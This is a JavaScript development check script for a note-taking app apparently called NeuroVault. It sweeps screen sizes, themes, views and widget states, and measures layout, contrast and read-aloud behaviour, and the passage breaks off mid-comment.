/* Dev-only layout and contrast sweep, loaded by actions.js only with ?check=1 (or injected by a test).
   Ported from the mockup's self-check (R5–R20), for the locked design only. It sizes the window frame to each screen,
   walks every view, state and theme, measures alignment in pixels, and leaves its result in window.__check
   (and a summary panel). Nothing it changes is saved: reader settings are set directly, not through config.json. */
'use strict';
(() => {
const SCREENS = { '1920x1080': [1920, 1080], '1366x768': [1366, 768], 'portrait1080': [1080, 1920], '3440x1440': [3440, 1440] };
const frame = document.getElementById('frame');
const errs = []; addEventListener('error', e => errs.push(e.message));
const out = { screens: Object.keys(SCREENS), combos: 0, issues: {}, contrast: {}, numbers: {}, errs };
const iss = (k, v) => (out.issues[k] ||= []).push(v);
const wait = ms => new Promise(r => setTimeout(r, ms));
const lum = c => { const m = c.match(/[\d.]+/g).map(Number); const [r, g, b] = m.slice(0, 3).map(v => { v /= 255; return v <= .03928 ? v / 12.92 : ((v + .055) / 1.055) ** 2.4; }); return .2126 * r + .7152 * g + .0722 * b; };
const ratio = (fg, bg) => { const a = lum(fg), b = lum(bg); return +((Math.max(a, b) + .05) / (Math.min(a, b) + .05)).toFixed(2); };
const colorOf = v => { const p = document.createElement('i'); app.appendChild(p); p.style.color = `var(${v})`; const c = getComputedStyle(p).color; p.remove(); return c; };
const px = el => { const r = el.getBoundingClientRect(), a = app.getBoundingClientRect(); return { l: r.left - a.left, r: r.right - a.left, t: r.top - a.top, b: r.bottom - a.top, w: r.width, h: r.height }; };
const cy = el => { const p = px(el); return p.t + p.h / 2; };
const half = v => Math.round(v * 2) / 2;
const keep = { reader: { ...READER }, ui: { ...UI }, side: S.side };
let screen = '1920x1080';
function size(name) { screen = name; const [w, h] = SCREENS[name]; frame.style.width = w + 'px'; frame.style.height = h + 'px'; }
// Set any mix of screen, view state, reader settings, sample vault and sidebars, then render once
function set(o) {
  if (o.screen) size(o.screen);
  if (o.sample) loadSample(o.sample);
  ['theme', 'accent', 'font', 'textsize'].forEach(k => { if (o[k]) READER[k] = o[k]; }); applyReader();
  if (o.tstate) { seedTimer(o.tstate); UI.tstate = o.tstate; }
  ['view', 'state', 'tpage', 'widgets', 'zen', 'inspector'].forEach(k => { if (o[k]) UI[k] = o[k]; }); document.body.dataset.inspector = UI.inspector;
  if (o.side !== undefined) S.side = o.side;
  if (o.modal !== undefined) S.modal = o.modal;
  renderAll(); out.combos++;
}
// No sideways scroll, nothing clipped without an ellipsis, header actions clear of the path
function measure(key) {
  const issues = [];
  // QC 71: under ?check=1 nothing can be heard (mute.js)
  if (typeof nvAudible === 'function') { const aud = nvAudible(); if (aud.length) issues.push(`something can be heard under mute: ${aud.slice(0, 3).join(', ')}`); }
  // QC 70 (design profile "Only NeuroVault's own tooltips"): nothing keeps a native title or an SVG <title> once it's drawn
  if (typeof tipFlush === 'function') { tipFlush();
    const nat = [...document.querySelectorAll('[title]')].filter(el => !el.closest(TIP_SKIP)).map(el => `${el.tagName.toLowerCase()}.${(el.className?.baseVal ?? el.className ?? '').toString().split(' ')[0]} "${el.getAttribute('title')}"`);
    const svgT = [...document.querySelectorAll('svg title')].filter(el => !el.closest(TIP_SKIP)).length;
    if (nat.length || svgT) issues.push(`a Windows tooltip: ${nat.slice(0, 3).join(', ')}${svgT ? ` · ${svgT} SVG <title>` : ''}`); }
  if (app.scrollWidth > app.clientWidth + 1) issues.push('app scrolls sideways');
  app.querySelectorAll('*').forEach(el => { const cs = getComputedStyle(el); if (el.clientWidth > 0 && el.scrollWidth > el.clientWidth + 1 && cs.overflowX === 'hidden' && cs.textOverflow !== 'ellipsis') issues.push('clipped ' + (el.className || el.tagName).toString().slice(0, 30)); });
  app.querySelectorAll('.view').forEach(v => { if (v.scrollWidth > v.clientWidth + 1) issues.push('view scrolls sideways'); });
  const hdr = app.querySelector('.app-header'), acts = hdr?.querySelector('.header-actions'), crumb = hdr?.querySelector('.crumb');
  if (hdr?.offsetParent && acts.getBoundingClientRect().left < crumb.getBoundingClientRect().left + 120) issues.push('header actions crowd the path');
  if (issues.length) iss('layout', `${key}: ${[...new Set(issues)].slice(0, 4).join(', ')}`);
}
const inside = (sel, key) => { const r = app.getBoundingClientRect(); app.querySelectorAll(sel).forEach(el => { const b = el.getBoundingClientRect(); if (b.width && (b.left < r.left - 1 || b.right > r.right + 1 || b.top < r.top - 1 || b.bottom > r.bottom + 1)) iss('outside the window', key + ' ' + String(el.className).slice(0, 24)); }); };

async function run() {
  await document.fonts.ready;
  if (new URLSearchParams(location.search).get('only') === 'buildp') {   // Build P: just its block (?check=1&only=buildp)
    await checkBuildP(); Object.assign(READER, keep.reader); applyReader(); Object.assign(UI, keep.ui); document.body.dataset.inspector = UI.inspector; S.side = keep.side; S.modal = null; S.split = null;
    loadSample('typical'); seedTimer(UI.tstate); frame.style.width = ''; frame.style.height = ''; renderAll();
    out.summary = `Build P only: ${out.combos} combinations, ${Object.keys(out.issues).length} issue groups, ${errs.length} script errors`; return; }
  if (new URLSearchParams(location.search).get('only') === 'buildo') {   // Build O: just its block (?check=1&only=buildo)
    await checkBuildO(); Object.assign(READER, keep.reader); applyReader(); Object.assign(UI, keep.ui); document.body.dataset.inspector = UI.inspector; S.side = keep.side; S.modal = null; S.split = null;
    loadSample('typical'); seedTimer(UI.tstate); frame.style.width = ''; frame.style.height = ''; renderAll();
    out.summary = `Build O only: ${out.combos} combinations, ${Object.keys(out.issues).length} issue groups, ${errs.length} script errors`; return; }
  if (new URLSearchParams(location.search).get('only') === 'r68') {   // R68: just its block (?check=1&only=r68)
    await checkR68(); Object.assign(READER, keep.reader); applyReader(); Object.assign(UI, keep.ui); document.body.dataset.inspector = UI.inspector; S.side = keep.side; S.modal = null; S.split = null;
    loadSample('typical'); seedTimer(UI.tstate); frame.style.width = ''; frame.style.height = ''; renderAll();
    out.summary = `R68 only: ${out.combos} combinations, ${Object.keys(out.issues).length} issue groups, ${errs.length} script errors`; return; }
  if (new URLSearchParams(location.search).get('only') === 'r69') {   // R69: just its block (?check=1&only=r69)
    await checkR69(); Object.assign(READER, keep.reader); applyReader(); Object.assign(UI, keep.ui); document.body.dataset.inspector = UI.inspector; S.side = keep.side; S.modal = null; S.split = null;
    loadSample('typical'); seedTimer(UI.tstate); frame.style.width = ''; frame.style.height = ''; renderAll();
    out.summary = `R69 only: ${out.combos} combinations, ${Object.keys(out.issues).length} issue groups, ${errs.length} script errors`; return; }
  if (new URLSearchParams(location.search).get('only') === 'fixa') {   // fix round A: just its block (?check=1&only=fixa)
    await checkFixA(); Object.assign(READER, keep.reader); applyReader(); Object.assign(UI, keep.ui); document.body.dataset.inspector = UI.inspector; S.side = keep.side; S.modal = null; S.split = null;
    loadSample('typical'); seedTimer(UI.tstate); frame.style.width = ''; frame.style.height = ''; renderAll();
    out.summary = `Fix A only: ${out.combos} combinations, ${Object.keys(out.issues).length} issue groups, ${errs.length} script errors`; return; }
  if (new URLSearchParams(location.search).get('only') === 'qc87') {   // QC 87: just its block (?check=1&only=qc87)
    await checkQc87(); Object.assign(READER, keep.reader); applyReader(); Object.assign(UI, keep.ui); document.body.dataset.inspector = UI.inspector; S.side = keep.side; S.modal = null; S.split = null;
    loadSample('typical'); seedTimer(UI.tstate); frame.style.width = ''; frame.style.height = ''; renderAll();
    out.summary = `QC 87 only: ${out.combos} combinations, ${Object.keys(out.issues).length} issue groups, ${errs.length} script errors`; return; }
  if (new URLSearchParams(location.search).get('only') === 'qc115') {   // QC 115: just its block (?check=1&only=qc115)
    await checkQc115(); Object.assign(READER, keep.reader); applyReader(); Object.assign(UI, keep.ui); document.body.dataset.inspector = UI.inspector; S.side = keep.side; S.modal = null; S.split = null;
    loadSample('typical'); seedTimer(UI.tstate); frame.style.width = ''; frame.style.height = ''; renderAll();
    out.summary = `QC 115 only: ${out.combos} combinations, ${Object.keys(out.issues).length} issue groups, ${errs.length} script errors`; return; }
  const only = new URLSearchParams(location.search).get('only');
  if (only === 'buildm' || only === 'keys' || only === 'panes' || only === 'r6' || only === 'map') {   // Build M · R57: only=map, the mind map
    // Build M: just its block (?check=1&only=buildm), the shortcuts (only=keys) or the split screen (only=panes)
    if (only === 'keys') await checkKeys(); else if (only === 'panes') await checkPanes(); else if (only === 'r6') await checkRound6(); else if (only === 'map') await checkMindmap(); else await checkBuildM(); Object.assign(READER, keep.reader); applyReader(); Object.assign(UI, keep.ui); document.body.dataset.inspector = UI.inspector; S.side = keep.side; S.modal = null; S.split = null;
    loadSample('typical'); seedTimer(UI.tstate); frame.style.width = ''; frame.style.height = ''; renderAll();
    out.summary = `Build M ${only} only: ${out.combos} combinations, ${Object.keys(out.issues).length} issue groups, ${errs.length} script errors`; return; }
  if (new URLSearchParams(location.search).get('only') === 'buildv') {   // Build V: just its block (?check=1&only=buildv)
    await checkBuildV(); Object.assign(READER, keep.reader); applyReader(); Object.assign(UI, keep.ui); document.body.dataset.inspector = UI.inspector; S.side = keep.side; S.modal = null; S.split = null;
    loadSample('typical'); seedTimer(UI.tstate); frame.style.width = ''; frame.style.height = ''; renderAll();
    out.summary = `Build V only: ${out.combos} combinations, ${Object.keys(out.issues).length} issue groups, ${errs.length} script errors`; return; }
  if (new URLSearchParams(location.search).get('only') === 'dv') {   // Build DV: just its block (?check=1&only=dv)
    await checkDocViewer(); Object.assign(READER, keep.reader); applyReader(); Object.assign(UI, keep.ui); document.body.dataset.inspector = UI.inspector; S.side = keep.side; S.modal = null; S.split = null;
    loadSample('typical'); seedTimer(UI.tstate); frame.style.width = ''; frame.style.height = ''; renderAll();
    out.summary = `Build DV only: ${out.combos} combinations, ${Object.keys(out.issues).length} issue groups, ${errs.length} script errors`; return; }
  if (new URLSearchParams(location.search).get('only') === 'r69') {   // Build N · R69: just speaking a question (?check=1&only=r69)
    await checkAskVoice(); Object.assign(READER, keep.reader); applyReader(); Object.assign(UI, keep.ui); document.body.dataset.inspector = UI.inspector; S.side = keep.side; S.modal = null; S.split = null;
    loadSample('typical'); seedTimer(UI.tstate); frame.style.width = ''; frame.style.height = ''; renderAll();
    out.summary = `R69 only: ${out.combos} combinations, ${Object.keys(out.issues).length} issue groups, ${errs.length} script errors`; return; }
  if (new URLSearchParams(location.search).get('only') === 'buildn') {   // Build N: just its block (?check=1&only=buildn)
    await checkBuildN(); await checkAskVoice(); Object.assign(READER, keep.reader); applyReader(); Object.assign(UI, keep.ui); document.body.dataset.inspector = UI.inspector; S.side = keep.side; S.modal = null; S.split = null;
    loadSample('typical'); seedTimer(UI.tstate); frame.style.width = ''; frame.style.height = ''; renderAll();
    out.summary = `Build N only: ${out.combos} combinations, ${Object.keys(out.issues).length} issue groups, ${errs.length} script errors`; return; }
  out.fonts = [...document.fonts].filter(f => f.status === 'loaded').map(f => f.family + ' ' + f.weight);
  /* ---- Contrast: the nine themes, three accents, time-left and project colours, sticky text ---- */
  for (const [th] of THEMES) {
    set({ screen: '1920x1080', theme: th, accent: 'violet', view: 'notes', sample: 'typical' });
    const bg = colorOf('--bg'), panel = colorOf('--panel'), card = colorOf('--card');
    const c = { 'text/bg': ratio(colorOf('--text'), bg), 'text/card': ratio(colorOf('--text'), card), 'muted/bg': ratio(colorOf('--muted'), bg), 'muted/panel': ratio(colorOf('--muted'), panel) };
    for (const [ac] of ACCENTS) { READER.accent = ac; applyReader(); c[`${ac}: accent-text/accent-bg`] = ratio(colorOf('--accent-text'), colorOf('--accent-bg')); c[`${ac}: on-accent/accent`] = ratio(colorOf('--on-accent'), colorOf('--accent')); }
    READER.accent = 'violet'; applyReader();
    c['time calm/warm/low on card'] = ['--time-calm', '--time-warm', '--time-low'].map(k => ratio(colorOf(k), card));
    c['project slots on card'] = [1, 2, 3, 4, 5, 6].map(n => ratio(colorOf('--proj-' + n), card));
    out.contrast[th] = c;
    Object.entries(c).forEach(([k, v]) => { const min = /time|project/.test(k) ? 3 : 4.5; [].concat(v).forEach(x => { if (x < min) iss('contrast under ' + (min === 3 ? '3:1 (graphics)' : 'AA'), `${th} ${k} ${x}`); }); });
  }
  out.contrast.stickyText = ['--sticky-yellow', '--sticky-pink', '--sticky-mint', '--sticky-blue', '--sticky-lilac'].map(k => ratio(colorOf('--on-sticky'), colorOf(k)));
  set({ theme: 'obsidian' });

  /* ---- Every view, both samples, every screen: no sideways scroll or clipping ---- */
  for (const sc of Object.keys(SCREENS)) for (const sample of ['typical', 'stress', 'empty']) for (const view of ['notes', 'tasks', 'timer', 'history', 'newtab']) {
    set({ screen: sc, sample, view, tstate: 'running', tpage: 'session', side: true, inspector: 'shown', widgets: 'none', zen: 'off', modal: null });
    measure(`${sc}/${sample}/${view}`);
  }
  /* ---- Timer: every state and page ---- */
  out.numbers.timerButtons = {};
  for (const sc of Object.keys(SCREENS)) {
    for (const tstate of ['idle', 'running', 'stopwatch', 'checkin', 'pausepick', 'paused', 'overtime', 'rate']) {
      set({ screen: sc, sample: 'stress', view: 'timer', tpage: 'session', tstate }); measure(`timer/${sc}/${tstate}`);
      const tc = app.querySelector('.timer-card'); if (tc) out.numbers.timerButtons[tstate] = [...new Set([...tc.querySelectorAll('.timer-controls > .btn, .timer-panel-row > .btn, .timer-panel-row > .field')].map(b => b.offsetHeight))];
    }
    for (const tpage of ['insights', 'history', 'projects']) for (const sample of ['stress', 'empty']) { set({ screen: sc, sample, view: 'timer', tpage, tstate: 'running' }); measure(`timer/${sc}/${tpage}/${sample}`); }
  }
  /* ---- Notes: the folder tree fully open (stress has a 7-level chain and long names), sidebar shown and hidden; every settings page ---- */
  out.numbers.tree = {};
  for (const sc of Object.keys(SCREENS)) for (const side of [true, false]) {
    set({ screen: sc, sample: 'stress', view: 'notes', tpage: 'session', tstate: 'idle', side });
    S.open = new Set([...D.projects.map(x => x.id), ...D.folders.map(f => f.id)]); renderAll(); measure(`tree/${sc}/${side ? 'side' : 'no-side'}`);
    if (side) app.querySelectorAll('[data-tree]').forEach(r => { out.numbers.tree.deepest = Math.max(out.numbers.tree.deepest || 0, +r.getAttribute('aria-level') || 1); const nm = r.querySelector('.tree-name'); if (nm && nm.offsetWidth < 40) iss('tree name squeezed', sc + '/' + nm.textContent.slice(0, 20)); });
    out.numbers.tree.titlebar = app.querySelector('.titlebar').offsetHeight; out.numbers.tree.winBtns = [...app.querySelectorAll('.win-btn')].map(x => x.offsetWidth + '×' + x.offsetHeight).join(' ');
  }
  for (const sc of Object.keys(SCREENS)) for (const [sec] of SET_SECTIONS) {
    S.setSec = sec; set({ screen: sc, sample: 'stress', view: 'notes', side: true, modal: 'settings' });
    const m = app.querySelector('.modal--settings'), pane = m.querySelector('.settings-pane');
    if (pane.scrollWidth > pane.clientWidth + 1) iss('settings scrolls sideways', sc + '/' + sec);
    if (m.getBoundingClientRect().right > app.getBoundingClientRect().right + 1) iss('settings wider than the window', sc + '/' + sec);
  }
  S.setSec = 'appearance'; set({ modal: null });
  /* ---- Panels and widgets stay inside the window; zen hides the chrome ---- */
  for (const sc of Object.keys(SCREENS)) {
    set({ screen: sc, sample: 'typical', view: 'notes' }); openPalette(); inside('.modal', `${sc}/palette`); if (!app.querySelector('.modal--picker')) iss('palette missing', sc); closeModal();
    for (const widgets of ['timer', 'nudge']) for (const tstate of ['idle', 'running', 'paused', 'rate']) { set({ screen: sc, view: 'notes', widgets, tstate }); inside('.widget, .nudge', `${sc}/${widgets}/${tstate}`); }
    // Phase 6B: the voice dialog's recording, transcribing and check states (on the sample), inside the window, no sideways scroll
    for (const stage of ['recording', 'transcribing', 'check']) { set({ screen: sc, view: 'notes', widgets: 'none', modal: voiceDemo(stage) }); measure(`voice/${sc}/${stage}`); inside('.modal', `${sc}/voice-${stage}`);
      const mb = app.querySelector('.modal-body'); if (stage === 'recording') { if (!app.querySelector('.vpill')) iss('voice pill missing', `${sc}/${stage}`); } else if (!mb) iss('voice dialog missing', `${sc}/${stage}`); else if (mb.scrollWidth > mb.clientWidth + 1) iss('voice dialog scrolls sideways', `${sc}/${stage}`);   // Build A: recording is the pill
      if (stage === 'check' && (app.querySelectorAll('.voice-pane [data-anchor="a2"]').length !== 2 || !app.querySelector('.anchor.is-missing .anchor-insert'))) iss('voice anchors not marked', sc); }
    S.voice.stage = 'idle'; set({ modal: null });
    set({ widgets: 'none', zen: 'on', tstate: 'running' }); measure(`zen/${sc}`); if (app.querySelector('.rail').offsetParent) iss('zen still shows the rail', sc); set({ zen: 'off' });
  }
  /* ---- Phase 6A: sticky notes (cards, ⋮ menu, pickers) and the brain dump bar stay inside the window; zen hides the cards ---- */
  out.numbers.capture = {};
  for (const sc of Object.keys(SCREENS)) for (const sample of ['typical', 'stress']) {
    const k = `${sc}/${sample}`;
    set({ screen: sc, sample, view: 'notes', widgets: 'timer', tstate: 'running' }); D.stickies.forEach((s, i) => { s.open = true; if (i === 1) { s.w = 360; s.h = 300; } if (i === 2) { s.x = 99999; s.y = 99999; } }); renderAll(); out.combos++;
    const cards = app.querySelectorAll('.overlay-layer .sticky'); inside('.widget', `${k}/stickies`); measure(`stickies/${k}`);
    if (cards.length !== D.stickies.length) iss('sticky cards', `${k}: ${cards.length} of ${D.stickies.length}`);
    S.stickyMenu = D.stickies[0].id; renderAll(); out.combos++; inside('.sticky .menu', `${k}/sticky menu`); if (app.querySelectorAll('.sticky .menu .menu-item').length !== 5) iss('sticky menu items', k);   /* Build H: Pop out joins the four */ S.stickyMenu = null;
    for (const m of ['sticky-append', 'sticky-attach']) { S.pickSticky = D.stickies[0].id; S.moveQ = ''; set({ modal: m }); inside('.modal', `${k}/${m}`); if (!app.querySelector('[data-act="sticky-pick"]')) iss('sticky picker empty', `${k}/${m}`); }
    set({ modal: 'dump' }); inside('.dump', `${k}/dump`); measure(`dump/${k}`); if (!app.querySelector('#dump-input')) iss('dump bar missing', k);
    out.numbers.capture[k] = `${cards.length} cards · ${app.querySelectorAll('.dump-item').length} thoughts shown`;
    set({ modal: null, zen: 'on' }); if (app.querySelector('.overlay-layer .sticky')?.offsetParent) iss('zen still shows sticky notes', k); set({ zen: 'off', widgets: 'none' });
  }
  /* ---- Build H (R34): the Card quick timer in every state (inside the window, one control height, its questions inside), the Paper
          sticky (Pop out on its head and first in its ⋮ menu, controls on the scale), the status bar's "on your desktop" link and its list,
          and Settings → Timer alerts (Timer minutes, Check-ins, Alerts as cards) ---- */
  out.numbers.buildH = {};
  { const keepItems = POPS.items, keepT = { ...D.tset }, hs = el => [...el.querySelectorAll('.widget-body .btn, .widget-body .field, .widget-body .seg, .widget-body .pick')].filter(x => x.offsetWidth).map(x => Math.round(x.getBoundingClientRect().height));
    for (const sc of Object.keys(SCREENS)) {
      const card = [];
      for (const tstate of ['idle', 'running', 'pausepick', 'checkin', 'paused', 'overtime', 'rate']) {
        set({ screen: sc, sample: 'typical', view: 'notes', widgets: 'timer', tstate, modal: null, zen: 'off' }); const q = app.querySelector('.widget.qt');
        if (!q?.classList.contains('qt--card')) { iss('Build H: quick timer is not the Card', `${sc}/${tstate}`); continue; }
        inside('.widget.qt', `${sc}/card ${tstate}`); measure(`card/${sc}/${tstate}`);
        const h = [...new Set(hs(q))]; if (h.length !== 1 || h[0] !== 32) iss('Build H: quick timer control heights', `${sc}/${tstate}: ${h.join(', ')}`);
        const want = { pausepick: q.querySelectorAll('.qt-reasons .pick').length === 8, checkin: !!q.querySelector('#qt-milestone'), rate: q.querySelectorAll('.rate-row').length === 2 && !!q.querySelector('[data-act="tlog"][data-v="rate"]'), running: !!q.querySelector('.qt-time') && !!q.querySelector('[data-act="tpause"]') }[tstate];
        if (want === false) iss('Build H: quick timer question missing', `${sc}/${tstate}`);
        if (!q.querySelector('.widget-head [data-act="pop-out"]')) iss('Build H: no Pop out on the quick timer', `${sc}/${tstate}`);
        card.push(`${tstate} ${Math.round(q.offsetHeight)}`);
      }
      out.numbers.buildH[sc] = 'card ' + card.join(' · ');
      set({ widgets: 'none', tstate: 'running' }); D.stickies.forEach((s, i) => { s.open = i < 2; s.out = false; }); renderAll();
      const st = app.querySelector('.overlay-layer .sticky');
      if (!st?.classList.contains('sticky--paper')) iss('Build H: sticky is not Paper', sc);
      else { if (!st.querySelector('.widget-head [data-act="pop-out"]')) iss('Build H: no Pop out on the sticky', sc);
        const off = [...st.querySelectorAll('button')].filter(b => b.offsetWidth && ![24, 28, 32, 36].includes(Math.round(b.getBoundingClientRect().height))); if (off.length) iss('Build H: sticky controls off the scale', `${sc}: ${off.length}`);
        S.stickyMenu = D.stickies[0].id; renderAll(); out.combos++; const first = app.querySelector('.sticky .menu .menu-item'); if (first?.dataset.act !== 'pop-out') iss('Build H: Pop out is not first in the ⋮ menu', sc); S.stickyMenu = null; }
      // one sticky and the timer popped out: the sticky leaves the layer, the quick timer stays hidden, the status bar link counts them
      POPS.items = [{ kind: 'sticky', id: rawId(D.stickies[1].id), key: 'sticky:' + rawId(D.stickies[1].id), on_top: true }, { kind: 'timer', id: null, key: 'timer', on_top: false }];
      D.stickies[1].out = true; set({ widgets: 'timer' }); const link = app.querySelector('.status-bar .pop-link');
      if (app.querySelector('.overlay-layer .widget.qt') || app.querySelectorAll('.overlay-layer .sticky').length !== 1) iss('Build H: popped-out cards still in the window', sc);
      if (!link || !/2 on your desktop/.test(link.textContent)) iss('Build H: status bar link', `${sc}: ${link?.textContent}`);
      else { POPS.menu = true; renderAll(); out.combos++; inside('.pop-menu', `${sc}/pop list`); const rows = app.querySelectorAll('.pop-menu .pop-row');
        if (rows.length !== 2 || !app.querySelector('.pop-menu [data-act="pop-all-in"]')) iss('Build H: pop list rows', `${sc}: ${rows.length}`);
        const m = px(app.querySelector('.pop-menu')), l = px(app.querySelector('.status-bar .pop-link')); if (m.b > l.t + 1) iss('Build H: pop list not above its link', `${sc}: ${m.b} vs ${l.t}`); POPS.menu = false; }
      POPS.items = []; D.stickies.forEach(s => { s.out = false; s.open = false; }); set({ widgets: 'none' });
      // Settings → Timer alerts: three cards, eight minute boxes on one height, nothing past the pane
      S.setSec = 'alerts'; set({ modal: 'settings' }); const pane = app.querySelector('.modal--settings .settings-pane'), boxes = [...pane.querySelectorAll('.cf-card--mins .min-field')];
      if (pane.querySelectorAll('.cf-card').length !== 4 ||   // Build L: a fourth card, the timer's question after NeuroVault was closed
        boxes.length !== 8) iss('Build H: Timer alerts cards', `${sc}: ${pane.querySelectorAll('.cf-card').length} cards, ${boxes.length} boxes`);
      if (new Set(boxes.map(b => Math.round(b.getBoundingClientRect().height))).size !== 1 || pane.scrollWidth > pane.clientWidth + 1) iss('Build H: Timer minutes layout', sc);
      if (!pane.querySelector('[data-act="tset-set"][data-k="checkin"][aria-pressed="true"]')) iss('Build H: check-in interval', sc);
      measure(`settings-alerts/${sc}`); set({ modal: null });
    }
    // the flow: an edited set sorts itself and is offered; a bad number is refused; Back to the defaults
    const keepSave = saveSettings; saveSettings = () => {};   // nothing the check changes is saved
    S.modal = 'settings'; S.setSec = 'alerts'; renderAll();
    const edit = (k, i, v) => { const f = app.querySelector(`[data-act="min-set"][data-k="${k}"][data-i="${i}"]`); f.value = v; f.dispatchEvent(new Event('change', { bubbles: true })); };
    edit('planned', 1, '20'); edit('unplanned', 3, '90'); const val = app.querySelector('.cf-card--mins .cf-card-val').textContent, link1 = !!app.querySelector('[data-act="min-reset"]');
    edit('planned', 1, '0'); const err = app.querySelector('.min-err')?.textContent || '', kept = timerMins('planned').join('/');
    S.modal = null; set({ widgets: 'timer', tstate: 'idle' }); const qt = [...app.querySelectorAll('.widget.qt [data-act="qt-dur"]')].map(b => b.dataset.v).join('/');
    set({ widgets: 'none', view: 'timer', tpage: 'session' }); const tv = [...app.querySelectorAll('[data-act="tdur"]')].map(b => b.dataset.v).join('/');
    S.modal = 'settings'; renderAll(); fire('min-reset'); const back = `${timerMins('unplanned').join('/')} · ${timerMins('planned').join('/')}`, link2 = !!app.querySelector('[data-act="min-reset"]');
    out.numbers.buildH.minutes = `${val} · link ${link1} · 0 → "${err}", kept ${kept} · quick timer ${qt} · Timer view ${tv} · back ${back}, link ${link2}`;
    if (val !== 'Unplanned 5 / 15 / 25 / 90 · Planned 15 / 20 / 45 / 60' || !link1 || !err || kept !== '15/20/45/60' || qt !== '5/15/25/90' || tv !== '15/20/45/60' || back !== '5/15/25/45 · 15/30/45/60' || link2) iss('Build H: minute sets flow', out.numbers.buildH.minutes);
    saveSettings = keepSave; D.tset = keepT; POPS.items = keepItems; set({ modal: null, view: 'notes', tstate: 'running', widgets: 'none' }); }
  /* ---- Phase 6C: the read bar on every screen; the karaoke spans and highlight (the check never speaks) ---- */
  out.numbers.readAloud = {};
  for (const sc of Object.keys(SCREENS)) {
    set({ screen: sc, sample: 'typical', view: 'notes', side: true, inspector: 'shown', modal: null }); fire('read');
    const bar = app.querySelector('.readbar'); if (!bar) { iss('read bar missing', sc); continue; }
    inside('.readbar', `${sc}/read`); measure(`read/${sc}`);
    const words = app.querySelectorAll('.doc .ka-w').length; READ.ix = 5; paintRead();
    const word = app.querySelectorAll('.doc .is-word').length, sent = app.querySelectorAll('.doc .is-sent').length, sb = app.querySelector('.status-bar');
    out.numbers.readAloud[sc] = `${words} words · ${word} word marked · ${sent} sentence spans tinted · bar ${Math.round(bar.offsetWidth)}px`;
    if (!words || word !== 1 || sent < 2) iss('read-aloud highlight', out.numbers.readAloud[sc]);
    if (app.querySelector('.doc').isContentEditable) iss('note editable while reading', sc);
    if (sb && bar.getBoundingClientRect().bottom > sb.getBoundingClientRect().top) iss('read bar over the status bar', sc);
    if (!app.querySelector('.app-header [data-act="read"][aria-pressed="true"]')) iss('Read aloud button not pressed', sc);
    closeModal(); READ.ix = 0; if (app.querySelector('.doc .ka-w') || READ.playing) iss('read aloud left behind', sc);
  }
  /* ==== Fix B (QC round 3, items 9, 12, 13): the note cut into pieces (every word once, in order, inside its sentence,
     at most 30 words); the progress line along the bar's foot (inside it, a track to click, fixed tabular slots, painted
     from the timeline, a click share → a sentence start); the spoken word underlined only (its width doesn't change) ==== */
  out.numbers.fixB = {};
  for (const sc of Object.keys(SCREENS)) {
    set({ screen: sc, sample: 'typical', view: 'notes', side: true, inspector: 'shown', modal: null }); fire('read');
    const bar = app.querySelector('.readbar'), prog = bar?.querySelector('.read-prog'), track = bar?.querySelector('[data-act="read-seek"]');
    if (!bar || !prog || !track) { iss('Fix B: progress line missing', sc); closeModal(); continue; }
    const b = bar.getBoundingClientRect(), p = prog.getBoundingClientRect(), t = track.getBoundingClientRect();
    if (p.left < b.left - .5 || p.right > b.right + .5 || p.bottom > b.bottom + .5) iss('Fix B: progress line outside the bar', sc);
    if (t.width < 120 || t.height < 16) iss('Fix B: progress track too small to click', `${sc} ${t.width.toFixed(0)}×${t.height.toFixed(0)}`);
    if ([...bar.querySelectorAll('.read-time, .read-sub')].some(x => getComputedStyle(x).fontVariantNumeric !== 'tabular-nums')) iss('Fix B: times not in tabular figures', sc);
    // the pieces
    const ws = readWords(), ps = readPieces(); let next = 0, bad = '';
    ps.forEach((x, i) => {
      if (x.start !== next) bad ||= `piece ${i} starts at ${x.start}, not ${next}`; next = x.end + 1;
      if (x.end - x.start + 1 > 30) bad ||= `piece ${i} has ${x.end - x.start + 1} words`;
      if (ws[x.start].dataset.s !== ws[x.end].dataset.s) bad ||= `piece ${i} crosses a sentence`;
      if (x.text.split(' ').length !== x.end - x.start + 1) bad ||= `piece ${i}'s text has a different word count`;
      if (i < ps.length - 1 && !READ_GAP[x.gap]) bad ||= `piece ${i} has no rest after it`;
    });
    if (next !== ws.length) bad ||= `${ws.length - next} words left out`;
    if (bad) iss('Fix B: note pieces', `${sc}: ${bad}`);
    // the timeline, painted (no speech: Kokoro is pretended, and the pieces get made-up lengths)
    const keepRead = { engine: READ.engine, sherpa: READ.sherpa };
    Object.assign(READ, { engine: 'sherpa', sherpa: { available: true, voices: [] }, pieces: ps, durs: ps.map(() => 2), state: 'play', at: Math.floor(ps.length / 2) });
    const tl = readTl(); READ.pos = tl[tl.length - 1] / 2; paintReadProgress();
    const fill = parseFloat(bar.querySelector('[data-read-fill]').style.width), el = bar.querySelector('[data-read-el]').textContent, lf = bar.querySelector('[data-read-left]').textContent;
    const s0 = readSeekShare(0), s1 = readSeekShare(.999), starts = readSentStarts();
    out.numbers.fixB[sc] = `${ws.length} words in ${ps.length} pieces · bar ${Math.round(b.width)}px · track ${Math.round(t.width)}px · half way: ${el} | ${fill.toFixed(0)}% | ${lf} · share 0 → word ${s0}, 1 → word ${s1}`;
    if (Math.abs(fill - 50) > .5 || el !== readClock(READ.pos) || lf !== readClock(READ.pos) + ' left') iss('Fix B: progress not painted from the timeline', out.numbers.fixB[sc]);
    if (s0 !== 0 || !starts.includes(s1) || s1 !== starts.filter(x => x <= ps[ps.length - 1].start).pop()) iss('Fix B: a click on the line does not go to a sentence start', out.numbers.fixB[sc]);
    Object.assign(READ, { ...keepRead, pieces: null, durs: [], state: '', at: 0, pos: 0 });
    // the spoken word: underlined, and as wide as when it isn't spoken (nothing moves)
    const w = app.querySelector('.doc p .ka-w') || app.querySelector('.doc .ka-w'); w.classList.remove('is-word'); const w0 = w.getBoundingClientRect().width;
    w.classList.add('is-word'); const cs = getComputedStyle(w), w1 = w.getBoundingClientRect().width;
    if (Math.abs(w1 - w0) > .01 || !cs.textDecorationLine.includes('underline')) iss('Fix B: the spoken word moves or has no underline', `${sc} ${w0}→${w1} ${cs.fontWeight} ${cs.textDecorationLine}`);
    w.classList.remove('is-word'); closeModal();
  }
  /* ==== end Fix B ==== */
  /* ---- Build B: Settings → AI models (R22 "pick") on the sample PCs, folded and open; the ask before a download; the status bar names the model ---- */
  out.numbers.ai = {};
  // Build N (R60): the page is reworked (ai-settings.js), as four tabs (feedback: "ai models - four tabs"): each tab's sections, each
  // with its line; every setting has one; the models on this PC as rows (all of them, the best first, one button each); a download is
